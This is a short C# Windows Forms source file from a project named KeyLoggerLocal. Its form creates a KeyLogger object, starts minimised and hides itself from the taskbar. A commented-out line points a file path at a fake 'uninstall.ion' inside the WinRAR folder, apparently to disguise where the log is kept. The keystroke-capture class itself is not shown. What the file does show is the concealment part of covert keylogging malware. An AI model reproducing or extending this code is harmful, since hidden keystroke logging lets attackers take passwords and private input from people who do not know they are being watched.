using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;

namespace KeyLoggerLocal
{

    public partial class frmKeyLogger : Form
    {
        
        //string file =  Environment.GetFolderPath(Environment.SpecialFolder. ProgramFiles) + "\\WinRAR\\uninstall.ion";
        KeyLogger kl;

        public frmKeyLogger()
        {
            InitializeComponent();

            kl = new KeyLogger();
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
        }

        private void frmKeyLogger_Load(object sender, EventArgs e)
        {

        }
    }
}